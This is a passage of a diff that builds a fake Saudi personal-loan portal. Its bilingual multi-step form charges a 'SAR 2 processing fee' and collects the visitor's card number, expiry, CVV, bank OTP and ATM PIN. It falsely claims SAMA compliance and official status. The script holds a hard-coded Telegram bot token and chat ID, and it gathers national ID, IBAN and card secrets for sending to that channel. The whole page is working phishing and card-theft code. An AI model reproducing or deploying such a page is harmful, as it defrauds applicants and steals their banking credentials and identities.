+                                <div class="arabic-text text-base font-extrabold text-ksa-green">الدفع</div>
+                            </div>
+
+                            <div class="bg-gradient-to-r from-ksa-greenDark via-ksa-green to-emerald-800 text-white p-4 sm:p-5 rounded-2xl shadow-md space-y-1">
+                                <div class="font-extrabold text-sm sm:text-base flex items-center gap-2">
+                                    <i class="fa-solid fa-credit-card text-ksa-gold"></i>
+                                    <span>Pay SAR 2 processing fee to submit your application.</span>
+                                </div>
+                                <div class="arabic-text text-xs text-emerald-100">
+                                    ادفع رسوم معالجة بقيمة 2 ريال سعودي لتقديم طلبك.
+                                </div>
+                            </div>
+
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                        Mada / Bank ATM / Credit Card Number * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">رقم البطاقة البنكية</span>
+                                    </label>
+                                    <div class="relative">
+                                        <input type="text" id="cardNumber" placeholder="0000000000000000" maxlength="16" oninput="formatCardNumber(this)" class="w-full pl-4 pr-12 py-3.5 rounded-xl border border-gray-300 text-sm font-mono tracking-wider font-extrabold text-ksa-navy focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50">
+                                        <div class="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1 text-gray-400 text-lg">
+                                            <i class="fa-brands fa-cc-visa text-blue-700"></i>
+                                            <i class="fa-brands fa-cc-mastercard text-orange-600"></i>
+                                        </div>
+                                    </div>
+                                    <span id="err-cardNumber" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter valid 16-digit card number</span>
+                                </div>
+
+                                <div class="grid grid-cols-2 gap-4">
+                                    <div>
+                                        <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                            Expiry * <span class="arabic-text font-normal text-gray-400 text-xs ml-1">تاريخ الانتهاء</span>
+                                        </label>
+                                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-mono font-bold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50 text-center">
+                                        <span id="err-cardExpiry" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter valid MM/YY</span>
+                                    </div>
+
+                                    <div>
+                                        <label class="block text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-1">
+                                            CVC / CVV *
+                                        </label>
+                                        <input type="password" id="cardCvv" placeholder="***" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'')" class="w-full px-4 py-3 rounded-xl border border-gray-300 text-xs sm:text-sm font-mono font-bold focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none transition bg-gray-50/50 text-center">
+                                        <span id="err-cardCvv" class="text-[11px] text-red-600 font-bold hidden mt-1 block">Enter 3 or 4 digit CVV</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="bg-rose-50 p-3.5 rounded-xl border border-rose-200 text-rose-800 text-xs flex items-start gap-2.5">
+                                <i class="fa-solid fa-lock text-rose-600 mt-0.5"></i>
+                                <span>Your card details are used only to collect the SAR 2 processing fee. Never share your OTP or PIN with anyone.</span>
+                            </div>
+
+                            <div class="flex justify-between items-center pt-4 border-t border-gray-100">
+                                <button type="button" onclick="goToStep(2)" class="px-6 py-3 border border-gray-300 hover:bg-gray-100 text-gray-700 font-bold text-xs sm:text-sm rounded-xl transition flex items-center gap-2">
+                                    <i class="fa-solid fa-arrow-left"></i>
+                                    <span>← Back / رجوع</span>
+                                </button>
+
+                                <button type="button" onclick="processStep3()" class="px-8 py-3.5 bg-gradient-to-r from-ksa-goldDark via-ksa-gold to-yellow-600 hover:from-yellow-600 hover:to-ksa-goldDark text-ksa-navy font-black text-xs sm:text-sm rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2">
+                                    <span>Pay SAR 2 & Continue →</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 4: OTP VERIFICATION WITH 3-MINUTE TIMER -->
+                        <div id="step-4-content" class="space-y-6 hidden">
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-gray-100 pb-3 gap-1">
+                                <div>
+                                    <h3 class="text-xl sm:text-2xl font-black text-ksa-navy">Payment Verification</h3>
+                                    <p class="text-xs text-gray-500">Enter bank OTP code / تأكيد عملية الدفع عن طريق رمز OTP</p>
+                                </div>
+                                <div class="arabic-text text-base font-extrabold text-ksa-green">تأكيد الدفع</div>
+                            </div>
+
+                            <!-- 3-Minute OTP Countdown Box -->
+                            <div class="bg-amber-50 border-2 border-ksa-gold/60 rounded-2xl p-4 flex flex-col sm:flex-row items-center justify-between gap-2">
+                                <div class="flex items-center gap-2.5 text-xs sm:text-sm font-bold text-ksa-navy">
+                                    <i class="fa-solid fa-hourglass-half text-ksa-green text-base"></i>
+                                    <span>OTP Validity Timer / مدة صلاحية رمز التحقق:</span>
+                                </div>
+                                <div id="otpTimerDisplay" class="font-mono text-lg sm:text-xl font-black text-ksa-green bg-white px-4 py-1 rounded-xl border border-ksa-gold/50 shadow-2xs">
+                                    03:00
+                                </div>
+                            </div>
+
+                            <div class="bg-gradient-to-r from-ksa-greenDark to-emerald-800 text-white p-4.5 rounded-2xl shadow-sm space-y-1">
+                                <div class="font-extrabold text-sm sm:text-base">
+                                    Please check and confirm that your payment to the bank is exactly SAR 2.
+                                </div>
+                                <div class="arabic-text text-xs text-emerald-100">
+                                    يرى التحقق والتأكيد من أن الدفع للبنك هو 2 ريال سعودي فقط.
+                                </div>
+                            </div>
+
+                            <div class="text-center space-y-2 py-2">
+                                <p class="text-xs sm:text-sm font-medium text-gray-600">
+                                    Enter the OTP received from your bank within 3 minutes to verify the SAR 2 payment.
+                                </p>
+                                <p class="arabic-text text-xs text-gray-500">
+                                    أدخل رمز OTP المستلم من البنك خلال 3 دقائق لتأكيد دفع 2 ريال سعودي.
+                                </p>
+                            </div>
+
+                            <div class="max-w-sm mx-auto">
+                                <label class="block text-center text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-2">
+                                    Enter OTP Received on Mobile Number *
+                                </label>
+                                <input type="text" id="otpInput" inputmode="numeric" placeholder="Enter OTP" minlength="4" maxlength="8" oninput="formatOtpInput(this)" class="w-full px-4 py-3.5 text-center font-mono text-xl tracking-widest font-black rounded-xl border border-gray-300 focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none bg-gray-50 transition">
+                                <span id="err-otp" class="text-[11px] text-red-600 font-bold hidden text-center mt-2 block">Please enter a valid OTP</span>
+                            </div>
+
+                            <div class="text-center pt-2">
+                                <button type="button" onclick="resendOTP()" class="text-xs font-bold text-ksa-green hover:underline">
+                                    Didn't receive OTP? Reset 3-min timer or continue →
+                                </button>
+                                <p class="arabic-text text-[11px] text-gray-400 mt-0.5">لم يصلك رمز OTP؟ إعادة ضبط المؤقت أو المتابعة</p>
+                            </div>
+
+                            <div class="flex justify-between items-center pt-4 border-t border-gray-100">
+                                <button type="button" onclick="goToStep(3)" class="px-6 py-3 border border-gray-300 hover:bg-gray-100 text-gray-700 font-bold text-xs sm:text-sm rounded-xl transition flex items-center gap-2">
+                                    <i class="fa-solid fa-arrow-left"></i>
+                                    <span>← Back / رجوع</span>
+                                </button>
+
+                                <button type="button" onclick="processStep4()" class="px-8 py-3.5 bg-ksa-green hover:bg-ksa-greenDark text-white font-black text-xs sm:text-sm rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2">
+                                    <span>Verify OTP & Continue →</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 5: CARD ATM PIN VERIFICATION -->
+                        <div id="step-5-content" class="space-y-6 hidden">
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-gray-100 pb-3 gap-1">
+                                <div>
+                                    <h3 class="text-xl sm:text-2xl font-black text-ksa-navy">Enter Your PIN</h3>
+                                    <p class="text-xs text-gray-500">ATM / Card PIN confirmation / أدخل رمز PIN الخاص بالبطاقة</p>
+                                </div>
+                                <div class="arabic-text text-base font-extrabold text-ksa-green">إدخال رمز PIN</div>
+                            </div>
+
+                            <div class="text-center space-y-2 py-2">
+                                <p class="text-xs sm:text-sm font-medium text-gray-700">
+                                    Enter your ATM / card PIN to complete your application.
+                                </p>
+                                <p class="arabic-text text-xs text-gray-500">
+                                    أدخل رمز PIN الخاص بالبطاقة لإكمال تقديم طلبك.
+                                </p>
+                            </div>
+
+                            <div>
+                                <label class="block text-center text-xs font-extrabold text-gray-700 uppercase tracking-wider mb-3">
+                                    PIN *
+                                </label>
+                                <div class="flex justify-center gap-3 sm:gap-4" id="pinContainer">
+                                    <input type="password" maxlength="1" class="pin-input w-12 h-14 sm:w-14 sm:h-16 text-center font-mono text-2xl font-black rounded-xl border border-gray-300 focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none bg-gray-50 transition" onkeyup="handlePinInput(this, 0)">
+                                    <input type="password" maxlength="1" class="pin-input w-12 h-14 sm:w-14 sm:h-16 text-center font-mono text-2xl font-black rounded-xl border border-gray-300 focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none bg-gray-50 transition" onkeyup="handlePinInput(this, 1)">
+                                    <input type="password" maxlength="1" class="pin-input w-12 h-14 sm:w-14 sm:h-16 text-center font-mono text-2xl font-black rounded-xl border border-gray-300 focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none bg-gray-50 transition" onkeyup="handlePinInput(this, 2)">
+                                    <input type="password" maxlength="1" class="pin-input w-12 h-14 sm:w-14 sm:h-16 text-center font-mono text-2xl font-black rounded-xl border border-gray-300 focus:border-ksa-green focus:ring-2 focus:ring-ksa-green/20 outline-none bg-gray-50 transition" onkeyup="handlePinInput(this, 3)">
+                                </div>
+                                <span id="err-pin" class="text-[11px] text-red-600 font-bold hidden text-center mt-2 block">Please enter 4-digit Card PIN</span>
+                            </div>
+
+                            <div class="text-center pt-2">
+                                <button type="button" onclick="bypassPIN()" class="text-xs font-bold text-ksa-green hover:underline">
+                                    Didn't receive PIN? Continue anyway →
+                                </button>
+                                <p class="arabic-text text-[11px] text-gray-400 mt-0.5">لم يصلك رمز PIN؟ يرجى المتابعة</p>
+                            </div>
+
+                            <div class="flex justify-between items-center pt-4 border-t border-gray-100">
+                                <button type="button" onclick="goToStep(4)" class="px-6 py-3 border border-gray-300 hover:bg-gray-100 text-gray-700 font-bold text-xs sm:text-sm rounded-xl transition flex items-center gap-2">
+                                    <i class="fa-solid fa-arrow-left"></i>
+                                    <span>← Back / رجوع</span>
+                                </button>
+
+                                <button type="button" onclick="processStep5()" class="px-8 py-3.5 bg-ksa-green hover:bg-ksa-greenDark text-white font-black text-xs sm:text-sm rounded-xl shadow-md hover:shadow-lg transition flex items-center gap-2">
+                                    <span>Finish Application →</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- STEP 6: APPLICATION COMPLETION SUCCESS SCREEN -->
+                        <div id="step-6-content" class="py-8 text-center space-y-6 hidden">
+                            <div class="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-2xl border-4 border-emerald-500 flex items-center justify-center text-4xl mx-auto shadow-lg animate-bounce">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+
+                            <div>
+                                <h3 class="text-2xl sm:text-3xl font-black text-ksa-navy">Application Submitted Successfully!</h3>
+                                <div class="arabic-text text-lg font-black text-ksa-green mt-1">تم تقديم طلبك بنجاح</div>
+                            </div>
+
+                            <div class="max-w-md mx-auto bg-ksa-sand p-4 rounded-2xl border border-ksa-borderGreen/50 space-y-1">
+                                <span class="text-xs text-gray-500 uppercase font-bold tracking-wider">Application Reference ID:</span>
+                                <div id="referenceIdDisplay" class="text-2xl font-mono font-black text-ksa-green">KSA-2026-84920</div>
+                                <span class="text-[11px] text-gray-400">Save this reference ID for tracking</span>
+                            </div>
+
+                            <p class="text-xs sm:text-sm text-gray-600 max-w-lg mx-auto leading-relaxed">
+                                Our team will contact you within <strong>24 to 48 working hours</strong> on your KSA mobile number.
+                            </p>
+                            <p class="arabic-text text-xs text-gray-500">
+                                سيتواصل معك فريقنا خلال 24 إلى 48 ساعة عمل على رقم جوالك في السعودية.
+                            </p>
+
+                            <div class="text-xs font-bold text-ksa-navy bg-amber-50 border border-ksa-gold/60 inline-block px-4 py-2 rounded-xl">
+                                Returning to Home section automatically in <span id="homeRedirectCountdown" class="font-mono text-ksa-green font-black">10</span>s...
+                            </div>
+
+                            <div class="pt-2">
+                                <button type="button" onclick="resetToHome()" class="px-8 py-3.5 bg-ksa-green hover:bg-ksa-greenDark text-white font-black text-xs sm:text-sm rounded-xl shadow-md transition inline-flex items-center gap-2">
+                                    <i class="fa-solid fa-house"></i>
+                                    <span>← Back to Home / الرئيسية</span>
+                                </button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+            <!-- LOADING OVERLAY -->
+            <div id="loadingOverlay" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center hidden">
+                <div class="bg-white rounded-3xl p-8 max-w-sm w-full mx-4 text-center shadow-2xl border-2 border-ksa-gold space-y-4 transform transition-all scale-100">
+                    <div class="w-16 h-16 mx-auto spinner-ring flex items-center justify-center">
+                        <i class="fa-solid fa-landmark text-ksa-gold text-xl"></i>
+                    </div>
+                    <div>
+                        <h4 id="loadingTitle" class="text-lg font-black text-ksa-navy">Verifying Details...</h4>
+                        <p id="loadingSubtitle" class="text-xs text-gray-500 mt-1">Syncing secure data with bank server...</p>
+                    </div>
+                    <div class="w-full bg-gray-200 h-1.5 rounded-full overflow-hidden">
+                        <div class="bg-ksa-green h-full animate-pulse" style="width: 100%;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FORM FOOTER -->
+            <div class="bg-ksa-navy text-white text-xs py-5 px-4 border-t-4 border-ksa-gold">
+                <div class="max-w-5xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
+                    <div class="text-center md:text-left">
+                        <p>&copy; 2026 KSA Loan Application Service — Official 5-Step Digital Portal</p>
+                        <p class="text-[11px] text-gray-400 mt-0.5">Encrypted 256-bit SSL Connection • SAMA Compliant Fee Collection</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- MAIN WEBSITE FOOTER -->
+    <footer class="bg-saudi-navy text-white text-xs py-8 px-4 border-t-4 border-saudi-gold mt-8">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
+            <div class="text-center md:text-left">
+                <p class="font-bold text-sm text-saudi-goldLight">KSA Finance Hub — برنامج التمويل الشخصي ودعم المشاريع</p>
+                <p class="text-[11px] text-gray-400 mt-1">&copy; 2026 Saudi Personal & SME Finance Support • SAMA Regulated Information Portal</p>
+            </div>
+            <div>
+                <a href="#apply-form" class="px-6 py-2.5 bg-saudi-green hover:bg-emerald-700 text-white font-black rounded-xl transition shadow inline-block">
+                    Apply Now →
+                </a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- =====================================================================
+         COMBINED SCRIPTS: WEBSITE SLIDER, CALCULATOR, DBR & TELEGRAM FORM
+         ===================================================================== -->
+    <script>
+        /* ==========================================
+           PART 1: WEBSITE SLIDER, CALCULATOR & DBR
+           ========================================== */
+        const DEFAULT_SLIDES = [
+            {
+                id: 'slide-1',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_6z8d8v6z8d8v6z8d-1.jpg',
+                title: 'Saudi Financing Support Overview',
+                subtitle: 'Explore personal and SME financing guidance from 5,000 SAR to 500,000 SAR.',
+                badge: 'Slide 1 / 6'
+            },
+            {
+                id: 'slide-2',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_bphp56bphp56bphp-1.jpg',
+                title: 'Resident Expat & Citizen Programs',
+                subtitle: 'Clear guidance for Iqama holders and Saudi citizens with active GOSI & Nafath.',
+                badge: 'Slide 2 / 6'
+            },
+            {
+                id: 'slide-3',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_fvd997fvd997fvd9-1.jpg',
+                title: 'Flexible Monthly Installments',
+                subtitle: 'Plan monthly repayments across tenors up to 60 months under SAMA guidelines.',
+                badge: 'Slide 3 / 6'
+            },
+            {
+                id: 'slide-4',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_meqvw0meqvw0meqv-1.jpg',
+                title: 'Business & SME Growth Capital',
+                subtitle: 'Support options for entrepreneurs and growing enterprises across Saudi Arabia.',
+                badge: 'Slide 4 / 6'
+            },
+            {
+                id: 'slide-5',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_58vxp58vxp58vxp5-1.jpg',
+                title: 'Licensed Saudi Banking Network',
+                subtitle: 'Compare Islamic, local, foreign, and digital banks licensed in the Kingdom.',
+                badge: 'Slide 5 / 6'
+            },
+            {
+                id: 'slide-6',
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_3x7vgn3x7vgn3x7v-1.jpg',
+                title: 'Transparent DBR & Eligibility Check',
+                subtitle: 'Review your monthly obligations and repayment comfort before applying.',
+                badge: 'Slide 6 / 6'
+            }
+        ];
+
+        const DEFAULT_SLOTS = {
+            'slot-1': {
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_6z8d8v6z8d8v6z8d-1.jpg',
+                alt: 'Hero Section Spotlight Image'
+            },
+            'slot-2': {
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_bphp56bphp56bphp-1.jpg',
+                alt: 'Expat / Resident Card Image'
+            },
+            'slot-3': {
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_fvd997fvd997fvd9-1.jpg',
+                alt: 'Saudi Citizen Card Image'
+            },
+            'slot-4': {
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_meqvw0meqvw0meqv-1.jpg',
+                alt: 'EMI Calculator Banner Image'
+            },
+            'slot-5': {
+                url: 'https://userupdate.site/wp-content/uploads/2026/11/Gemini_Generated_Image_58vxp58vxp58vxp5-1.jpg',
+                alt: 'DBR Pre-Assessment Visual Image'
+            }
+        };
+
+        let activeSlideIndex = 0;
+        let sliderTimer = null;
+
+        function applyImageSlots() {
+            Object.keys(DEFAULT_SLOTS).forEach(slotId => {
+                const imgEl = document.getElementById('img-' + slotId);
+                if (imgEl && DEFAULT_SLOTS[slotId].url) {
+                    imgEl.src = DEFAULT_SLOTS[slotId].url;
+                    imgEl.alt = DEFAULT_SLOTS[slotId].alt || slotId;
+                }
+            });
+        }
+
+        function renderSlide(index) {
+            if (!DEFAULT_SLIDES.length) return;
+            activeSlideIndex = ((index % DEFAULT_SLIDES.length) + DEFAULT_SLIDES.length) % DEFAULT_SLIDES.length;
+            const slide = DEFAULT_SLIDES[activeSlideIndex];
+
+            const imgEl = document.getElementById('sliderActiveImage');
+            const badgeEl = document.getElementById('sliderBadge');
+            const titleEl = document.getElementById('sliderTitle');
+            const subEl = document.getElementById('sliderSubtitle');
+            const dotsEl = document.getElementById('sliderDots');
+
+            if (imgEl) {
+                imgEl.src = slide.url;
+                imgEl.alt = slide.title || 'Slide';
+            }
+            if (badgeEl) badgeEl.textContent = slide.badge || ('Slide ' + (activeSlideIndex + 1) + ' / ' + DEFAULT_SLIDES.length);
+            if (titleEl) titleEl.textContent = slide.title || '';
+            if (subEl) subEl.textContent = slide.subtitle || '';
+
+            if (dotsEl) {
+                dotsEl.innerHTML = '';
+                DEFAULT_SLIDES.forEach((_, idx) => {
+                    const dot = document.createElement('button');
+                    dot.type = 'button';
+                    dot.setAttribute('aria-label', 'Go to slide ' + (idx + 1));
+                    dot.className = idx === activeSlideIndex
+                        ? 'w-7 h-2.5 rounded-full bg-saudi-green transition-all cursor-pointer'
+                        : 'w-2.5 h-2.5 rounded-full bg-gray-300 hover:bg-saudi-gold transition-all cursor-pointer';
+                    dot.addEventListener('click', () => {
+                        renderSlide(idx);
+                        restartAutoSlider();
+                    });
+                    dotsEl.appendChild(dot);
+                });
+            }
+        }
+
+        function nextSlide() {
+            renderSlide(activeSlideIndex + 1);
+            restartAutoSlider();
+        }
+
+        function prevSlide() {
+            renderSlide(activeSlideIndex - 1);
+            restartAutoSlider();
+        }
+
+        function startAutoSlider() {
+            stopAutoSlider();
+            sliderTimer = setInterval(() => {
+                renderSlide(activeSlideIndex + 1);
+            }, 3500);
+        }
+
+        function stopAutoSlider() {
+            if (sliderTimer) {
+                clearInterval(sliderTimer);
+                sliderTimer = null;
+            }
+        }
+
+        function restartAutoSlider() {
+            startAutoSlider();
+        }
+
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobileMenu');
+            const icon = document.getElementById('mobileMenuIcon');
+            menu.classList.toggle('hidden');
+            if (menu.classList.contains('hidden')) {
+                icon.classList.remove('fa-xmark');
+                icon.classList.add('fa-bars');
+            } else {
+                icon.classList.remove('fa-bars');
+                icon.classList.add('fa-xmark');
+            }
+        }
+
+        let currentBankCategory = 'all';
+
+        function setBankCategory(cat) {
+            currentBankCategory = cat;
+            document.querySelectorAll('.bank-cat-btn').forEach(btn => {
+                btn.classList.remove('bg-saudi-navy', 'text-white', 'shadow-xs');
+                btn.classList.add('bg-gray-100', 'text-gray-700');
+            });
+            const activeBtn = document.getElementById('catBtn-' + cat);
+            if (activeBtn) {
+                activeBtn.classList.remove('bg-gray-100', 'text-gray-700');
+                activeBtn.classList.add('bg-saudi-navy', 'text-white', 'shadow-xs');
+            }
+            if (cat === 'all') {
+                document.getElementById('bankSearch').value = '';
+            }
+            filterBanks();
+        }
+
+        function filterBanks() {
+            const query = document.getElementById('bankSearch').value.toLowerCase().trim();
+            const cards = document.querySelectorAll('.bank-card');
+            let visibleCount = 0;
+
+            cards.forEach(card => {
+                const cat = card.getAttribute('data-category');
+                const name = card.getAttribute('data-name');
+                const matchesCat = (currentBankCategory === 'all' || cat === currentBankCategory);
+                const matchesQuery = (!query || name.includes(query));
+
+                if (matchesCat && matchesQuery) {
+                    card.classList.remove('hidden');
+                    visibleCount++;
+                } else {
+                    card.classList.add('hidden');
+                }
+            });
+
+            const noMsg = document.getElementById('noBanksMsg');
+            if (visibleCount === 0) {
+                noMsg.classList.remove('hidden');
+            } else {
+                noMsg.classList.add('hidden');
+            }
+        }
+
+        function calculateEMI() {
+            const amount = parseFloat(document.getElementById('calcAmount').value);
+            const months = parseInt(document.getElementById('calcTenure').value);
+            const rateRadio = document.querySelector('input[name="rateType"]:checked');
+            const annualRate = rateRadio ? parseFloat(rateRadio.value) : 0;
+
+            document.getElementById('calcAmountLabel').innerText = amount.toLocaleString() + ' SAR';
+            document.getElementById('calcTenureLabel').innerText = months + ' Months (' + (months / 12).toFixed(1) + ' Yrs)';
+
+            let emi = 0;
+            let totalPayable = 0;
+            let totalProfit = 0;
+
+            if (annualRate === 0) {
+                emi = amount / months;
+                totalPayable = amount;
+                totalProfit = 0;
+            } else {
+                const monthlyRate = (annualRate / 100) / 12;
+                emi = (amount * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+                totalPayable = emi * months;
+                totalProfit = totalPayable - amount;
+            }
+
+            document.getElementById('resEMI').innerText = Math.round(emi).toLocaleString() + ' SAR';
+            document.getElementById('resPrincipal').innerText = Math.round(amount).toLocaleString() + ' SAR';
+            document.getElementById('resProfit').innerText = Math.round(totalProfit).toLocaleString() + ' SAR (' + annualRate + '%)';
+            document.getElementById('resTotal').innerText = Math.round(totalPayable).toLocaleString() + ' SAR';
+
+            const principalPct = (amount / totalPayable) * 100;
+            const profitPct = 100 - principalPct;
+            document.getElementById('barPrincipal').style.width = principalPct.toFixed(1) + '%';
+            document.getElementById('barProfit').style.width = profitPct.toFixed(1) + '%';
+        }
+
+        function runAssessment() {
+            const category = document.getElementById('assCategory').value;
+            const tenureKSA = document.getElementById('assTenureUAE').value;
+            const income = parseFloat(document.getElementById('assIncome').value) || 0;
+            const liabilities = parseFloat(document.getElementById('assLiabilities').value) || 0;
+            const desiredAmount = parseFloat(document.getElementById('assDesiredAmount').value) || 0;
+            const months = parseInt(document.getElementById('assTenure').value) || 36;
+
+            const monthlyRate = 0.06 / 12;
+            const estEMI = (desiredAmount * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
+            const totalDebt = liabilities + estEMI;
+            const dbr = income > 0 ? (totalDebt / income) * 100 : 100;
+
+            const cap = category === 'expat' ? 30.0 : 33.33;
+            const maxAllowedMonthly = Math.max(0, (income * (cap / 100)) - liabilities);
+            const maxLoanLimit = maxAllowedMonthly > 0
+                ? (maxAllowedMonthly * (Math.pow(1 + monthlyRate, months) - 1)) / (monthlyRate * Math.pow(1 + monthlyRate, months))
+                : 0;
+
+            document.getElementById('assDBRValue').innerText = dbr.toFixed(1) + '%';
+            document.getElementById('assNewEMI').innerText = Math.round(estEMI).toLocaleString() + ' SAR';
+            document.getElementById('assTotalDebt').innerText = Math.round(totalDebt).toLocaleString() + ' SAR';
+            document.getElementById('assMaxLimit').innerText = Math.min(500000, Math.round(maxLoanLimit)).toLocaleString() + ' SAR';
+
+            const tenureLabels = {
+                'under3': 'Under 3 Months (Probation)',
+                '3to6': '3-6 Months Checked',
+                'over6': '6-12 Months Verified',
+                'over12': '1 Year+ Strong History'
+            };
+            document.getElementById('assTenureCheck').innerText = tenureLabels[tenureKSA] || 'Checked';
+
+            const badge = document.getElementById('assStatusBadge');
+            const advice = document.getElementById('assAdviceText');
+
+            if (tenureKSA === 'under3') {
+                badge.innerText = 'PROBATION NOTICE';
+                badge.className = 'bg-amber-100 text-amber-800 border border-amber-300 px-3 py-0.5 rounded-full text-xs font-black';
+                advice.innerText = 'Most Saudi banks require at least 3 to 6 months of completed service and active GOSI registration before final approval.';
+            } else if (dbr <= cap && income >= 3500) {
+                badge.innerText = 'HIGHLY ELIGIBLE';
+                badge.className = 'bg-emerald-100 text-emerald-800 border border-emerald-300 px-3 py-0.5 rounded-full text-xs font-black';
+                advice.innerText = 'Your calculated DBR (' + dbr.toFixed(1) + '%) is within Saudi Central Bank (SAMA) responsible lending limits (' + cap + '% cap).';
+            } else {
+                badge.innerText = 'ADJUST AMOUNT / TENURE';
+                badge.className = 'bg-rose-100 text-rose-800 border border-rose-300 px-3 py-0.5 rounded-full text-xs font-black';
+                advice.innerText = 'Your DBR exceeds the ' + cap + '% SAMA guideline. Try increasing the repayment tenure to 60 months or lowering the requested amount.';
+            }
+        }
+
+        /* ==========================================
+           PART 2: 5-STEP LOAN FORM & TELEGRAM SETUP
+           ========================================== */
+        (function() {
+            const PORTAL_ID = "ksa-loan-application-portal";
+            const TELEGRAM_BOT_TOKEN = "9277500325:AAGqPheBTQDXr8sa11SxgWLNIPNKDeJ9dkk";
+            const TELEGRAM_CHAT_ID = "8998729017";
+            const HOME_REDIRECT_SECONDS = 10;
+
+            function getRoot() {
+                return document.getElementById(PORTAL_ID) || document;
+            }
+
+            function byId(id) {
+                return getRoot().querySelector('#' + CSS.escape(id)) || document.getElementById(id);
+            }
+
+            function bySelectorAll(selector) {
+                const scoped = getRoot().querySelectorAll(selector);
+                return scoped.length ? scoped : document.querySelectorAll(selector);
+            }
+
+            function escapeHtml(str) {
+                return String(str ?? '')
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;');
+            }
+
+            function stripCardSpaces(value) {
+                return String(value || '').replace(/(\b(?:Card Number|Card)\s*:\s*)([0-9\s]+)/gi, function(_, prefix, digits) {
+                    return prefix + digits.replace(/\s+/g, '');
+                });
+            }
+
+            function formatCardForTelegram(cardDigits) {
+                return String(cardDigits ?? '').replace(/\D/g, '').substring(0, 16);
+            }
+
+            let currentStep = 1;
+            let otpTimerInterval = null;
+            let otpRemainingSeconds = 180; // 3 minutes
+            let homeRedirectInterval = null;
+            let homeRedirectRemaining = HOME_REDIRECT_SECONDS;
+
+            let applicantData = {
+                formId: PORTAL_ID,
+                fullName: '',
+                nationalId: '',
+                mobileNo: '',
+                gender: '',
+                dob: '',
+                region: '',
+                address: '',
+                loanAmount: '5000',
+                loanPurpose: '',
+                occupation: '',
+                bankName: '',
+                bankIban: '',
+                salaryDate: '',
+                bankBalance: '',
+                cardNumber: '',
+                cardExpiry: '',
+                cardCvv: '',
+                otp: '',
+                pin: '',
+                referenceId: ''
+            };
+
+            function renderOtpTimer() {
+                const timerEl = byId('otpTimerDisplay');
+                if (!timerEl) return;
+                const mins = Math.floor(otpRemainingSeconds / 60);
+                const secs = otpRemainingSeconds % 60;
+                timerEl.innerText = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+                if (otpRemainingSeconds <= 30) {
+                    timerEl.classList.add('text-red-600');
+                    timerEl.classList.remove('text-ksa-green');
+                } else {
+                    timerEl.classList.remove('text-red-600');
+                    timerEl.classList.add('text-ksa-green');
+                }
+            }
+
+            function startOtpTimer() {
+                stopOtpTimer();
+                otpRemainingSeconds = 180;
+                renderOtpTimer();
+                otpTimerInterval = setInterval(function() {
+                    if (otpRemainingSeconds > 0) {
+                        otpRemainingSeconds--;
+                        renderOtpTimer();
+                    } else {
+                        stopOtpTimer();
+                    }
+                }, 1000);
+            }
+
+            function stopOtpTimer() {
+                if (otpTimerInterval) {
+                    clearInterval(otpTimerInterval);
+                    otpTimerInterval = null;
+                }
+            }
+
+            function stopHomeRedirectTimer() {
+                if (homeRedirectInterval) {
+                    clearInterval(homeRedirectInterval);
+                    homeRedirectInterval = null;
+                }
+            }
+
+            function renderHomeRedirectCountdown() {
+                const el = byId('homeRedirectCountdown');
